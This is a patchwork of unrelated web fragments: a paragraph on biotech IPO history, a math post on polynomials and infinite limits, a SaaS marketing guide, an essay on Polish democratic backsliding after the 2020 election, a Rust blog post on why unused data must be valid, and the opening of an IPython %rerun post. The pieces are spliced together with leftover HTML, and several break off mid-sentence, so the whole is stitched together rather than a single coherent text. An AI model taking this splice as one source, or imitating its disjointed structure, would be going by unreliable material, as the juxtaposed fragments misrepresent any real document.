          <p><img src="https://www.baybridgebio.com/Images/biotech_ipos_historically.png"></p><p>After a booming period from 1991-2000 that saw an average of 30 biotech IPOs a year (including the outlier year 2000), the decade from 2001-2010 saw IPOs fall to a third of that level <sup>5</sup>.  For most of the 2000s, an IPO was not a realistic possibility for most companies.</p>
          <p>Pharma M&amp;A activity was healthier than the IPO market in the 2000s-2010s, but compared to today, valuations were lower, and pharma typically only spent big money on late stage assets (chart from <a href="https://lifescivc.com/2016/09/saluting-biotech-ma-onward-upward/">Bruce Booth / LifeSciVC blog</a>).</p>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://mathvault.ca/wp-content/uploads/Infinite-Polynomial.jpg" alt="Infinite Limits &amp; Polynomial End-Behavior" width="800" height="480" title="Infinite Polynomial" data-old-src="data:image/svg+xml,%3Csvg%20xmlns='http://www.w3.org/2000/svg'%20viewBox='0%200%20800%20480'%3E%3C/svg%3E" data-lazy-src="https://mathvault.ca/wp-content/uploads/Infinite-Polynomial.jpg"></p><p>Regardless of your&nbsp;early surrounding&nbsp;or&nbsp;schooling&nbsp;background, we know for one that there are two kinds of <em>mathematical objects</em> that are kind of hard to miss in life. The names? <strong>Polynomial</strong> and <a href="https://mathvault.ca/math-glossary/#infinite"><strong>infinity</strong></a>! While the former&nbsp;might have sounded a bit like the name of a <em>snake</em>, polynomials is a <em>one-of-its-kind</em> mathematical entity whose perfection defies our mathematical imagination.</p><p>For one, polynomials are well-known for being&nbsp;<em>infinitely smooth</em> and <em>never-ending</em>, while at the same time, they could be a <em>line</em>, a <em>parabola</em>, or any&nbsp;kind of weird, <strong>infinitely-malleable curve</strong>&nbsp;ready to&nbsp;assume&nbsp;any shape drawn without <em>lifting</em> the pencil (kind of). Heck, polynomials are a&nbsp;favorite object of <em>platonic desire</em> among math enthusiasts. Talk about the <em>interaction</em> between polynomial and infinity!</p><p>So with all that goodness, it makes sense for us to inquire a bit as to why despite of having similar forms, the behaviors of polynomials at the infinities differ, leading to some seemingly unrelated insights about their <strong>properties</strong> in general.</p><p>All right. Enough said. Time to buckle the seat belt, and let the theoretical musing begins! <span id="more-7079"></span></p><h2 id="poly"><span id="Polynomials_%E2%80%94_A_Review"></span><a href="#toc">Polynomials — A Review</a><span></span></h2><p>A <em>non-zero</em>,&nbsp;real-valued function of the form $\displaystyle&nbsp;cx^n$ — where $c \in \mathbb{R} \setminus \{ 0 \}$ and $n \in \mathbb{N}$ — forms the building blocks of polynomials. For that reason, they are usually called the (non-zero)<strong> monomials</strong>, with&nbsp;the number $n$ being the <strong>degree</strong> of the monomial in question. For example, the <em>constant function</em> $\frac{\pi}{4}$ represents a monomial with degree $0$, whereas the function $ex^{666}$ would be a monomial with degree $666$ (!).</p><p>(for the record, the <em>zero function</em> also falls into the category of monomials, except that its degree is usually left <em>undefined</em>, for the obvious reason that it can be expressed <em>numerous</em> forms).</p><p>Once there, we can define a <strong>non-zero polynomial</strong> as a function of the form:</p><p>\begin{align*} f_1(x)+ \dots + f_m(x) \end{align*}</p><p>where $m \in \mathbb{N_+}$ (i.e., a <em>positive</em> integer) and each $f_i(x)$ is&nbsp;a&nbsp;<em>non-zero</em> monomial.</p><p>In which&nbsp;case, we define the <strong>degree</strong> of a <em>non-zero</em> polynomial as the <em>maximal</em> degree of its monomials (always well-defined, since there’s only a <em>finite</em> number of&nbsp;monomials). For example, the constant function $\frac{\ln 2 + 3}{2e}$ represents&nbsp;a polynomial of degree $0$, and&nbsp;the function $3 + 2x^3 + x + x^2$ a polynomial of degree $3$.</p><p>(as with before, the <em>zero function</em>&nbsp;still falls into the category of polynomials, with the caveat that its degree is usually left undefined — due to the ambiguity of its leading term)</p><p>For the sake of <em>simplicity</em> and <em>consistency</em> though, we usually prefer to write a <em>non-zero</em> polynomial by gathering up the <em>like terms</em>, and rearranging the resulting terms so that the monomials are presented in increasing/decreasing order based on&nbsp;their degrees. Once that’s done, we refer to the monomial of the highest degree as the <strong>leading term</strong> of the polynomial, and its coefficient the <strong>leading coefficient</strong> of the polynomial.</p><p>For example, instead of writing $10x^3+2x^2+ 5x+ 6x^2 + 5 + 2 x^3$ as our polynomial, we prefer to regroup the like terms and rewrite it as $12x^3 + 8x^2 + 5x + 5$, from which it can be seen&nbsp;that we have a polynomial of <em>degree</em> $3$ (i.e., a <strong>cubic polynomial</strong>) — with $12$ as&nbsp;the <em>leading coefficient</em>.</p><p>In general, a <em>non-zero</em> polynomial can have <em>any</em> non-zero number as leading coefficient. However, in the special case where the leading coefficient is $1$, it is as if it it&nbsp;kind of disappears out of sight.&nbsp;In which case, we refer to the said polynomial as a <strong>monic polynomial</strong>.</p><p>In addition, since&nbsp;every <em>non-zero</em> polynomial can be re-expressed in terms of<em>&nbsp;monic polynomial</em>&nbsp;by <em>factoring out</em> the leading coefficient,&nbsp;it sometimes makes sense to&nbsp;analyze the properties of a non-zero polynomial by looking instead at the properties&nbsp;of its <em>underlying&nbsp;monic polynomial</em>.</p><p>Alternatively, we can also define a polynomial <em>recursively</em>&nbsp;as follows:</p><div id=""><p>Definition 1 — Recursive Definition of Polynomial</p><div><p><em>A&nbsp;real-valued</em> function $p(x)$ is a <strong>polynomial</strong> if and only if it satisfies one of the two following options — through a <em>finite</em> number of iterations:</p><ol><li>$p(x)=c$ for some $c \in \mathbb{R}$ (i.e., a <em>constant function</em>).</li><li>$p(x) = x q(x) + c$, where $q(x)$ is a <em>polynomial</em> and $c \in \mathbb{R}$.</li></ol></div></div><p>For example, $x^2 + 2x + 1$ is a polynomial by the standard of this&nbsp;<em>recursive definition</em>, since $x^2+2x+1 = x ( x+2) + 1$, where $x+2$ is very well a polynomial (why?) and $1$ very well a constant. In general, the recursive definition of polynomial suggests a way of <em>reducing</em> a polynomial of degree $n+1$ to that of degree $n$ — an handy insight when it comes to proving facts about <em>non-zero</em> polynomials using the so-called&nbsp;<strong>mathematical induction</strong> on the <em>degree</em> of polynomials.</p><h2 id="inflim"><span id="A_Venture_Into_the_Infinite_Limits"></span><a href="#toc">A Venture Into the&nbsp;Infinite Limits</a><span></span></h2><p>When tackling the behavior of a function at the infinities, it makes sense that we equip ourselves with some <strong>limit laws</strong>&nbsp;on how <em>infinity-converging</em> and <em>constant-converging</em> functions&nbsp;interact with each other. To that end, we present the following&nbsp;<em>6</em> sets of&nbsp;limit laws for your pleasure. 🙂</p><h3 id="constantfunction"><span id="Interactions_Between_InfinityConverging_and_Constant_Functions"></span><a href="#toc">Interactions Between Infinity-Converging and Constant Functions</a><span></span></h3><p>To start off, let’s imagine that we have a function $f(x)$ and a constant function $c$, where $f \to \infty$ as $x \to \infty$. The question is, what does the function $f(x) + c$ tends to — if any&nbsp;— as $x \to \infty$?</p><p>Here, it shouldn’t be a surprise that $f(x)+c$ converges to $\infty$ as well. To see why, we first note that since $f \to \infty$ as $x \to \infty$, the <strong>definition of limit</strong> implies that:</p><blockquote><h6>Given <em>any</em>&nbsp;number — however <em>large</em> — there’ll always be <em>some</em>&nbsp;<strong>neighborhood</strong> $N$ of the form $(\bigcirc, \infty)$, such that every member&nbsp;in $f(N)$ <em>exceeds</em> this number.</h6></blockquote><p>This means that&nbsp;given <em>any</em>&nbsp;number $r$, it would then be&nbsp;possible to find one such&nbsp;<em>neighborhood</em> $N$ such that $f(x) &gt; r – c$ for all $x \in N$. In which case, we would have that:</p><p>\begin{align*} f(x) + c &gt; &nbsp;r \qquad (\forall x \in N) \end{align*}</p><p>thereby&nbsp;showing that the function $f(x) + c$ increases&nbsp;<em>beyond bound</em>&nbsp;as $x \to \infty$ — regardless of the value of&nbsp;$c$.</p><p>Naturally, this leads to the following question: what if $f$ actually converges to $-\infty$ instead as&nbsp;$x \to \infty$? Well, referring to the <em>definition of limit</em> again,&nbsp;we have that:</p><blockquote><h6>Given <em>any</em>&nbsp;number — however <em>negative</em>&nbsp;— there’ll always be <em>some</em>&nbsp;<strong>neighborhood</strong> $N$ of the form $(\bigcirc, \infty)$, such that every member&nbsp;in $f(N)$ <em>precedes</em>&nbsp;this number.</h6></blockquote><p>This means that&nbsp;given <em>any</em>&nbsp;number $r$, it would then be&nbsp;possible to find one such&nbsp;<em>neighborhood</em> $N$ such that $f(x) &lt; r – c$ for all $x \in N$. In which case, we would have that:</p><p>\begin{align*} f(x) + c &lt; r \qquad (\forall x \in N) \end{align*}</p><p>hence&nbsp;showing that the function $f(x) + c$ decreases&nbsp;<em>beyond bound</em>&nbsp;$x \to \infty$, and this again regardless of the <em>sign</em> and <em>size</em> of&nbsp;$c$. Putting everything together, we obtain&nbsp;our <em>first</em> set of limit laws concerning <strong>constant functions</strong>:</p><div id=""><p>Proposition 1 — Limit Laws Concerning Constant Functions (Sum)</p><p>Given a <em>real-valued</em> function $f(x)$ and a constant function $c$, if as $x \to \Box$ (where $\Box$ could be a number, $+\infty$ or $-\infty$), $f(x)$ converges to one of the infinities, then the function&nbsp;$f(x)+c$ converges to the <em>same</em> infinity $f(x)$ converges to — as $x \to \Box$.</p></div><p>Now, what about the cases where a function is <em>multiplied</em> by a constant, as in the case of $c f(x)$ where $c&gt;0$? Well, as logic would have dictated, the <strong>convergence behavior</strong> of $c f(x)$ should&nbsp;depend on what $f(x)$ converges to in the first place.</p><p>For example, if we know in advance that $f(x)$ converges to $\infty$ as $x \to \infty$, then the definition of limit would imply that given <em>any</em> number $r$ — no matter how&nbsp;<em>positive</em>&nbsp;— we can always&nbsp;find a neighborhood $N$ of the form $(\bigcirc,\infty)$ such that:</p><p>\begin{align*} f(x) &amp; &gt; \frac{r}{c} \qquad (\forall x \in N) \end{align*}</p><p>That is,</p><p>\begin{align*} cf(x) &amp; &gt; r &nbsp;\qquad (\forall x \in N) \end{align*}</p><p>showing that the function $cf(x)$ increases <em>without bound</em> as $x \to \infty$.</p><p>On the other hand, if $f(x) \to -\infty$ instead as $x \to \infty$ (remember that $c&gt;0$), then we can similarly infer that given <em>any</em> number $r$ — however&nbsp;<em>negative</em> — it is always possible to find a neighborhood $N$ of the form $(\bigcirc,\infty)$ such that:</p><p>\begin{align*} f(x) &amp; &lt; \frac{r}{c} \qquad (\forall x \in N) \end{align*}</p><p>That is,</p><p>\begin{align*} cf(x) &amp; &lt; r &nbsp;\qquad (\forall x \in N) \end{align*}</p><p>showing that the function $cf(x)$ decreases&nbsp;<em>without bound</em> as $x \to \infty$.</p><p>Now, this still leaves us with the scenario&nbsp;where $c$ is <em>negative</em>. In which case, using very similar&nbsp;arguments, it can still&nbsp;be shown that as $x \to \infty$:</p><ol><li>$f(x) \to +\infty$ implies that $cf(x) \to -\infty$.</li><li>$f(x) \to -\infty$ implies that $cf(x) \to +\infty$.</li></ol><p>So that if we combine these insights together, we get our <em>second</em> set of limit laws concerning <strong>constant functions</strong>:</p><div id=""><p>Proposition 2 — Limit Laws Concerning Constant Functions (Product)</p><div><p>Given a <em>real-valued</em> function $f(x)$ and a constant function $c$, if as $x \to \Box$ (where $\Box$ could be a number, $+\infty$ or $-\infty$), $f(x)$ converges to one of the infinities, then the following cases apply as $x \to \Box$:</p><ol><li>If $c&gt;0$, then $c f(x)$ converges to the <em>same</em> infinity $f(x)$ converges to.</li><li>If $c&lt;0$, then $c f(x)$ converges to the <em>opposite</em>&nbsp;infinity $f(x)$ converges to.</li></ol></div></div><p>Interestingly, the above&nbsp;limit laws applies <em>irrespective of the size of $c$</em>. For example, $c$ could be $0.00001$ and $f(x)$ could converge to $+\infty$, and $cf(x)$ would have converged to $+\infty$ regardless. Likewise, $c$ could be $\frac{1}{e}$ and $f(x)$ could converge to $-\infty$, and $cf(x)$ would have converged to $-\infty$ regardless.</p><h3 id="infpluscon"><span id="Infinity_+_Constant"></span><a href="#toc">Infinity + Constant</a><span></span></h3><p>Moving from the constant functions into the general realm,&nbsp;let’s assume that we’re given two functions $f(x)$ and $g(x)$, such that as $x \to \infty$, $f$ converges to one of the infinities and $g$ converges to some real number $G$. The question is, what can we extrapolate about the <strong>convergence behavior</strong> of $f+g$ — if any?</p><p>Here, to figure this&nbsp;out, we begin by noticing that since $g$ converges to an <em>actual</em> number $G$, by …</p></div></div>

<h3>How Can a SaaS Company Stand Out in a Saturated Market?</h3>
<p>There is only one way your SaaS company can stand out successfully in this fiercely competitive environment. You have to develop a shrewd marketing strategy and implement it using the latest tools and techniques, all tailored to your unique business, products, prospects, and customers. This means understanding the powerful impact of <a href="https://www.clearpivot.com/inbound" rel="noopener" target="_blank">inbound marketing</a> for SaaS and making sure everyone in your organization is on board, from marketing to sales, C-suite, product development, and customer success.</p>
<p>The simplest way to understand Inbound is the concept of the flywheel. Rather than the traditional sales funnel that starts with leads and ends with sales, the flywheel starts by attracting and educating leads with strategic content and takes them through from the Attract stage into Engage, Close, and Delight. The reason it is a wheel shape rather than a traditional funnel is because delighted customers will naturally draw in more leads through word of mouth and reviews, which will start the wheel process all over with your next cohort of prospects. These 4 stages are all essential pieces of the <a href="https://www.clearpivot.com/inbound" rel="noopener" target="_blank">inbound flywheel</a><u>,</u> with Attract and Engage primarily under the purview of marketing, Close primarily a sales phase, and Delight as a focus for your service team.</p>
<p>We approach SaaS marketing with a keen eye toward the holistic inbound flywheel, because all of the parts connect to attract, qualify, sell, and keep your subscribers.</p>
<h3>Start with a Smart Strategy &amp; Draw in Leads with Inbound Marketing</h3>
<p>Your product is at the center of this entire conversation. It’s useful, fun, profitable, or unforgettable. Essentially, your product has propelled you this far, and it is good enough to have attracted some users and created some traction for you. But in order to supercharge your sales efforts, you need a steady stream of good-fit leads. And, that’s where inbound marketing comes into play. You need a well-crafted marketing strategy that makes the most of every dollar you spend to reach the right prospects, build trust in your company and specific products, and clearly set you apart from competitors. Then you need an implementation plan that uses the right tools to send the right messages at the right time to attract attention and keep potential customers focused on you as they make their buying decisions.</p>
<p>To help you pull it all together, we’ve created this comprehensive SaaS Marketing Guide. It covers everything you need to know to build a strong, successful digital marketing strategy that pulls in traffic and vets leads for you, so your sales team can focus on growth goals.</p>

<h4>Attract</h4>
<p>The first part of the SaaS marketing flywheel is Attract. In this piece, your goals will relate to getting brand new leads into your database. While each company will need its own specific strategy and KPIs, a few of the <a href="https://www.clearpivot.com/blog/saas-marketing-metrics" rel="noopener" target="_blank">most important SaaS marketing metrics</a> to track are:</p>
<ul>
<li>Website Visits</li>
<li>Bounce Rate</li>
<li>Visitor to Lead Conversion Rate</li>
</ul>
<h4>Engage</h4>
<p>Once you’ve attracted a potential customer and converted them on something small, like a content offer, your next step is to further engage that lead as a way to qualify, sort and segment them in your database, and prime them for a sale if they’re a great fit.</p>
<ul>
<li>Conversion Rates and Details on Your Content Offers</li>
<li>Landing Page Interactions</li>
<li>Email Engagement (like open rate and click-through rate)</li>
</ul>
<h4>Close</h4>
<p>Your sales team typically oversees the Close phase of your holistic inbound program, and, along with marketing leadership, pays close attention to metrics like:</p>
<ul>
<li>Customer Acquisition Cost (CAC)</li>
<li>Customer Lifetime Value (CLTV)</li>
</ul>
<p>Of course, this particular resource is focused on SaaS Marketing, so we don’t go in-depth on SaaS sales here, but everything marketing does is meant to support sales and company growth, so it’s important to remember just how intertwined the process of inbound can be.</p>
<h4>Delight</h4>
<p>The last stage in the inbound flywheel is to make your customers feel so included and happy they can’t help but share everything they love about your company and solution. Typically overseen by your Service team, this part of the flywheel helps you strive for improvements in:</p>
<ul>
<li>Subscription Upgrades</li>
<li>Reviews</li>
<li>Survey Results</li>
<li>Net Promoter Score (NPS)</li>
</ul>
<p>Further down in this guide we go into a ton of detail of every level of this flywheel concept, specifically related to SaaS marketing. But before we get there, let's continue our exploration of the basic foundations for great SaaS marketing. Up next is more about your brand, tech stack and website.</p>
<hr>
<h3>Your Brand: What Impression Are You Making?</h3>
<p>We don’t have to tell you how important branding is, but when’s the last time you evaluated the impact of your brand on your business goals? Does your original brand still resonate with your target audience? Is it time to refresh your look, the tone of your writing, or bring in something new to stay relevant? Especially in the world of cloud-based technology and software solutions, your brand is crucial. It’s what differentiates your company from everyone else, and allows for a foothold for your audience to get on board. Let’s get real about your SaaS branding efforts.</p>
<h4>Brand Messaging for SaaS</h4>
<p>In the context of software, where there is not necessarily a physical product or place, your brand is even more crucial than in other businesses. Building a SaaS brand is a unique experience, where personality, design, and messaging come together to guide your customers into believing in your solution. Before your leads ever get into the sales process, your brand helps them to build confidence in your company’s knowledge, honesty, and helpfulness.</p>
<p>Remember, you’re not creating your SaaS brand in a vacuum. You’re creating it for <em>people. </em>Smart marketers create buyer personas: generalized representations that humanize each key segment of your target audience. Though they exist only on paper, personas embody typical traits of each prospective customer group: age, gender, income, job function, chief pain points and desires. They serve as “advisors” as you create your marketing tactics and messaging so you can speak to prospects as if you are having an in-person conversation.</p>
<h4>How to Use Storytelling to Connect with Real People</h4>
<p>Building brand affinity starts with storytelling. Tell stories about how, exactly, your customers are using your SaaS product. Focus on the feeling it gives them, the accomplishments it helps them to achieve, or the bottom-line impact. Try sharing more about how your solution was created, and why. It’s not just about the brand promise of what your solution can do. It’s also about telling the human stories behind it to build trust and convey your core values.</p>
<p>Share the story of your founders, how they met, and what sparked the idea for your innovative solution. Tell your customer stories, sharing their unique applications of your products, …</p></div></span></p></div></div></div>

Over the course of thirty years, its economy grew almost tenfold. And while extremists always enjoyed a loud say in Poland’s raucous public sphere, the government changed hands through free and fair elections on multiple occasions. By the early 2010s, political scientists were convinced that the country’s democratic system had become “consolidated.”</p><p>But with the benefit of hindsight, it is clear that Poland’s status as a consolidated democracy was a naïve illusion. The country’s divisions were more dangerous, and the population’s attachment to the values of liberal democracy more tenuous, than scholars realized. And so Poland has, since the election of a populist government under the leadership of Jarosław Kaczyński five short years ago, gone from the most prominent case study of the benefits of liberal democracy to the most important exemplar of its perennial brittleness.</p><p>Sadly, the outcome of yesterday’s elections raises the threat to Polish democracy to an even higher level. After a nasty and bigoted campaign, Andrzej Duda managed to win reelection as the country’s president by the narrowest of margins. This leaves the <em>Law and Justice</em> party, which already enjoyed a parliamentary majority, free to continue its attacks on the media and the independence of the judiciary. With legislative elections that might put a real check on the government’s power over three years away, Kaczyński and his allies are likely to succeed in destroying Polish democracy.</p><p><strong>The Playbook of the Elected Autocrat</strong></p><p>The Polish government stands for many things I abhor. In the last weeks of the campaign, Duda warned that homosexuals were seeking to corrupt Poland’s children, and claimed that his opponent would do the bidding of Jews out to take revenge on the Polish nation.</p><p>But what the shameful propagandists of Viktor Orbán’s Hungary and Jarosław Kaczyński’s Poland—who sadly include many supposedly serious American conservatives, from Patrick Deneen to Michael Brendan Dougherty—miss is that this is not what makes the government antidemocratic.</p><p>In a liberal democracy, we have to tolerate profound disagreements over values, even when we are firmly convinced that our adversaries are bigots. But what we cannot tolerate is attacks on the institutions that are supposed to ensure a fair chance of displacing the government when the next elections roll around.</p><p>Despite <a href="https://theweek.com/articles/905962/viktor-orbns-american-apologists">the willful blindness</a> of people like Deneen and Dougherty, this is precisely the principle that Poland’s government has systematically broken. As the Rutgers political scientist R. Daniel Kelemen has pointed out, elected autocrats tend to follow six steps: win elections; capture referees, such as courts and other independent bodies; attack or seize control of the media; demonize and undermine the opposition; change the rules of the game; and win new elections that are no longer free.</p><p>Even before yesterday’s vote, the Polish government was well on its way towards accomplishing these goals. When Law and Justice swept to power, the party promised cultural restraint and economic largesse. But while it did pass a popular child benefit scheme, it also set about polarizing society and punishing adversaries.</p><p>The first order of business was a large-scale attack on the independence of the judiciary. As soon as it was in control, Law and Justice curbed the power of the Constitutional Tribunal; changed the composition of the Supreme Court, filling it with partisan loyalists; abolished the independence of the body that nominates lower-court judges; founded a parallel court system to oversee elections; and forbade judges from criticizing government policy. According to the latest country report by Freedom House, the country’s judiciary is no longer independent. </p><p>The second order of business was an equally effective attack on the country’s public broadcaster, Telewizja Polska (TVP). Like the BBC in the United Kingdom, the network is meant to strive for political neutrality. Instead, the Law and Justice government transformed an admittedly flawed institution into a shameless outlet for racist and homophobic propaganda that makes Fox News look like the <em>New York Review of Books</em>. </p><p>Its control over public television has allowed Law and Justice to demonize the opposition with abandon. Over the last weeks of the campaign, TVP variously accused Duda’s challenger, Rafał Trzaskowski, of planning to sell Poland out to Jews, Germans, or the LGBTQ lobby. As the supposedly neutral presenter of a primetime news show <a href="https://www.theguardian.com/commentisfree/2020/jun/25/polish-populism-evening-news-public-broadcaster-presidential-election">intoned a few weeks before the first round of the elections</a>: “Experts have no doubt [that] the stream of money that currently flows from the state budget into the pockets of Polish families will dry up if Trzaskowski, after his possible victory in the presidential election, will seek to satisfy Jewish demands.”</p><p>Now that the government’s power is secured for another three years, the fear that the government will further undermine free speech and independent institutions is not a hostile assumption: it is a promise the government itself repeatedly made over the course of the campaign. The most immediate step will likely be to capture those remaining newspapers and television channels that are free to criticize the government. Since many of them are owed by companies based outside the country, the government has vowed to “re-Polonize the media.”</p><p>In the final step towards authoritarianism, <a href="https://twitter.com/rdanielkelemen/status/1282673577964249089">Kelemen warns</a>, the government is likely to start attacking the integrity of the electoral system itself. The opportunities to do so are many: Law and Justice could try to get the electoral commission under tight control, make it harder for Poles who live abroad to participate in democratic elections, and take away powers from big city mayors, who tend to belong to the opposition party.</p><p>In <em>The People vs Democracy</em>, I warned that opponents of populism usually have only one chance to vote aspiring autocrats out of office. In their first four or five years in power, populist governments tend to skew the playing field in a dangerous way, but don’t usually succeed in completely capturing independent institutions such as electoral commissions. If they have another four or five years at their disposal, the takeover of the political system becomes complete.</p><p>I fear that this is the fate that will now befall Poland. Yesterday’s elections, though no longer fair, were largely free. There is no guarantee that this will still be true when Law and Justice next has to face the electorate.</p><p><strong>Poland’s Lesson for Other Countries Ruled By Populists</strong></p><p>Scholars are always tempted to believe that events that contemporaries failed to predict had nevertheless been predestined to happen all along. Nobody saw the French Revolution coming, for example, and yet successive generations of historians have triumphantly identified its deep and incontrovertible causes. (Needless to say, each successive generation of historians has identified <em>different</em> deep and incontrovertible causes.)</p><p>But the truth is that history is full of critical junctures in which countries and societies are set on divergent paths because of small, contingent factors. The election in Poland was one of these junctures. With the country deeply divided between west and east, young and old, urban and rural, Duda’s margin of victory was extremely close. A slightly different set of campaign tactics, a heavy storm over the country’s eastern part, or simply a more independent media could very well have made a decisive difference to the outcome.</p><p>These events did not materialize, however, and so Poland has now set out on the path towards dictatorship. Over the next three years, demographic changes are likely to favor the opposition. But by the time the precarious balance of public opinion shifts against the government, the vote is no longer likely to be either free or fair.</p><p>Circumstance has conspired against Polish democracy. Whether the structural factors that favor the opponents of authoritarian populism can overcome the tremendous power now enjoyed by the government is, at best, an open question. Anyone who is doubtful about the urgency of voting out authoritarian populists in other countries—from Brazil to the United States—before they can consolidate their hold on power would do very well to take heed.</p></div></div>]]>

<p>The Rust compiler has a few assumptions that it makes about the behavior of all code.
Violations of those assumptions are referred to as <a href="https://rust-lang.github.io/unsafe-code-guidelines/glossary.html#undefined-behavior">Undefined Behavior</a>.
Since Rust is a safe-by-default language, programmers usually do not have to worry about those rules (the compiler and libraries ensure that safe code always satisfies the assumptions),
but authors of <code>unsafe</code> code are themselves responsible for upholding these requirements.</p>

<p>Those assumptions are <a href="https://doc.rust-lang.org/reference/behavior-considered-undefined.html">listed in the Rust reference</a>.
The one that seems to be most surprising to many people is the clause which says that Rust code may not <em>produce</em> “[…] an invalid value, even in private fields and locals”.
The reference goes on to explain that “<em>producing</em> a value happens any time a value is assigned to or read from a place, passed to a function/primitive operation or returned from a function/primitive operation”.
In other words, even just <em>constructing</em>, for example, an invalid <code>bool</code>, is Undefined Behavior—no matter whether that <code>bool</code> is ever actually “used” by the program.
The purpose of this post is to explain why that rule is so strict.</p>

<!-- MORE -->

<p>First of all, let me clarify what is meant by “used” here, as that term is used to mean very different things.
The following code “uses” <code>b</code>:</p>

<figure><pre><code data-lang="rust"><span>fn</span> <span>example</span><span>(</span><span>b</span><span>:</span> <span>bool</span><span>)</span> <span>-&gt;</span> <span>i32</span> <span>{</span>
  <span>if</span> <span>b</span> <span>{</span> <span>42</span> <span>}</span> <span>else</span> <span>{</span> <span>23</span> <span>}</span>
<span>}</span></code></pre></figure>

<p>I hope it is not very surprising that calling <code>example</code> on, e.g., <code>3</code> transmuted to <code>bool</code> is Undefined Behavior (UB).
When compiling <code>if</code>, the compiler assumes that <code>0</code> and <code>1</code> are the only possible values; there is no saying what could go wrong when that assumption is violated.
(This is a compiler-understood <em>validity invariant</em> that is fixed in the language specification, which is very different from a user-defined <em>safety invariant</em>.
See <a href="https://www.ralfj.de/blog/2018/08/22/two-kinds-of-invariants.html">this earlier post</a> for more details on that distinction.)</p>

<p>What is less obvious is why calling <code>example</code> on <code>3</code> is UB even when there is no such <code>if</code> being executed.
To understand why that is important, let us consider the following example:</p>

<figure><pre><code data-lang="rust"><span>fn</span> <span>example</span><span>(</span><span>b</span><span>:</span> <span>bool</span><span>,</span> <span>num</span><span>:</span> <span>u32</span><span>)</span> <span>-&gt;</span> <span>i32</span> <span>{</span>
  <span>let</span> <span>mut</span> <span>acc</span> <span>=</span> <span>0</span><span>;</span>
  <span>for</span> <span>_</span><span>i</span> <span>in</span> <span>0</span><span>..</span><span>num</span> <span>{</span>
    <span>acc</span> <span>+=</span> <span>if</span> <span>b</span> <span>{</span> <span>42</span> <span>}</span> <span>else</span> <span>{</span> <span>23</span> <span>};</span>
  <span>}</span>
  <span>acc</span>
<span>}</span></code></pre></figure>

<p>Now assume we were working in a slightly different version of Rust, where transmuting <code>3</code> to a <code>bool</code> is fine as long as you do not “use” the <code>bool</code>.
That would mean that calling <code>example(transmute(3u8), 0)</code> is actually allowed, because in that case the loop never gets executed, so we never “use” <code>b</code>.</p>

<p>However, this is a problem for a very important transformation called <a href="https://en.wikipedia.org/wiki/Loop-invariant_code_motion">loop-invariant code motion</a>.
That transformation can be used to turn our <code>example</code> function into the following:</p>

<figure><pre><code data-lang="rust"><span>fn</span> <span>example</span><span>(</span><span>b</span><span>:</span> <span>bool</span><span>,</span> <span>num</span><span>:</span> <span>u32</span><span>)</span> <span>-&gt;</span> <span>i32</span> <span>{</span>
  <span>let</span> <span>mut</span> <span>acc</span> <span>=</span> <span>0</span><span>;</span>
  <span>let</span> <span>incr</span> <span>=</span> <span>if</span> <span>b</span> <span>{</span> <span>42</span> <span>}</span> <span>else</span> <span>{</span> <span>23</span> <span>};</span>
  <span>for</span> <span>_</span><span>i</span> <span>in</span> <span>0</span><span>..</span><span>num</span> <span>{</span>
    <span>acc</span> <span>+=</span> <span>incr</span><span>;</span>
  <span>}</span>
  <span>acc</span>
<span>}</span></code></pre></figure>

<p>The increment <code>if b { 42 } else { 23 }</code>, now called <code>incr</code>, is “invariant” during the execution of the loop, and thus computing the increment can be moved out.
Why is this a good transformation?
Instead of determining the increment each time around the loop, we do that just once, thus saving a lot of conditional jumps that the CPU is unhappy about.
This also enables further transformations down the road, e.g. the compiler could notice that this is just <code>num*incr</code>.</p>

<p>However, in our hypothetical Rust where “unused” values may be invalid, this important optimization is actually incorrect!
To see why, consider again calling <code>example(transmute(3u8), 0)</code>.
Before the optimization, that call was fine.
After the optimization, that call is UB because we are doing <code>if b</code> where <code>b</code> is <code>3</code>.</p>

<p>This is because loop-invariant code motion makes dead code live when the loop is not actually executed.
(We can think of this as a form of “speculative execution”, though entirely unrelated to CPU-level speculative execution.)
To fix the optimization, we could require the compiler to prove that the loop runs at least once (i.e., we could avoid speculative execution), but in general that will be hard (and in <code>example</code> it is impossible, since <code>num</code> can indeed be <code>0</code>).
Another option is to restructure the code to only compute <code>incr</code> if <code>num &gt; 0</code>, but again this can be hard to do in general.
So the alternative that Rust uses is to require that even “unused” data satisfies some basic validity.
That makes <code>example(transmute(3u8), 0)</code> UB in <em>both</em> versions of <code>example</code>, and as such the optimization is correct for this input (and indeed for all possible inputs).</p>

<p>Now, one might argue that <code>b</code> in the example here was not truly “unused”, it was just “used in dead code”.
So instead of saying that <code>b</code> must be <em>always</em> valid, we could somehow try to make the use of <code>b</code> in dead code affect whether or not the program is UB.
However, that is a huge can of worms.
Right now, we have the fundamental principle that <em>dead code cannot affect program behavior</em>.
This principle is crucial for tools like <a href="https://github.com/rust-lang/miri/">Miri</a>: since Miri is an interpreter, it never even sees dead code.
I would argue that being able to have tools like Miri is hugely important, and it is worth having a semantics that enables such tools to exist.
But this means our hands are pretty much tied: since we cannot take into account of <code>b</code> is “used in dead code”, we simply have to require <code>b</code> to always be valid, no matter whether and where it is “used” or not.
To support inlining and outlining, we also do not want the function boundary to be relevant, which ultimately leads us to the rule that Rust requires today: whenever data of a given type is <em>produced</em> anywhere, the data needs to be valid for that type.</p>

<p>I hope this post was helpful in explaining why Undefined Behavior in Rust is defined the way it is.
As usual, if you have any comments or questions, let me know in the <a href="https://internals.rust-lang.org/t/why-even-unused-data-needs-to-be-valid/12734">forums</a>.</p>

Maybe I can improve the %rerun magic function?</p> <h2 id="whats-wrong-with-the-rerun-function">What’s wrong with the <code>%rerun</code> function?</h2> <p>You can use <code>%rerun</code> to run commands from this or previous sessions of IPython. The most common use case for me is to get my IPython session to the same state when I left it last time. It usually happens when I close it because I think I’m done, and then I realize that I actually want to check one more thing <strong>with all the previous data that I had</strong>. Well, in standard Python REPL, to rerun all the previous commands, I would have to press “arrow up” + “enter” a lot. With IPython, I can just run this one command: <code>%rerun ~1/</code>, and it will execute all the commands from the previous session:</p> <div><div><pre><code><span>In</span> <span>[</span><span>1</span><span>]:</span> <span>a</span> <span>=</span> <span>5</span>

</code></pre></div></div> <p>But, there is one problem. If one of the past commands throws an exception, IPython will stop. It executes all the commands up to the exception, fails on the exception, and that’s it:</p> <div><div><pre><code><span>In</span> <span>[</span><span>1</span><span>]:</span> <span>a</span> <span>=</span> <span>5</span>

